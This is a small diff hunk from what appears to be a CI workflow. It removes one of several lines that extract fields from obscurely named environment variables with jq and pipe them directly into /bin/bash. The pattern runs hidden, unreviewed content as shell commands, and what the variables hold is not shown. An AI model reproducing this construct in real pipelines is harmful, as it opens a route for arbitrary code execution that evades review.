@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$ef57" | jq -r .bb05 | /bin/bash
           printf '%s' "$ed6883" | jq -r .eq27 | /bin/bash
           printf '%s' "$eha6" | jq -r .pvlc4 | /bin/bash
-          printf '%s' "$bsno52" | jq -r .pzdni910 | /bin/bash
           printf '%s' "$rz50" | jq -r .dqn7 | /bin/bash
 
       - name: Save output
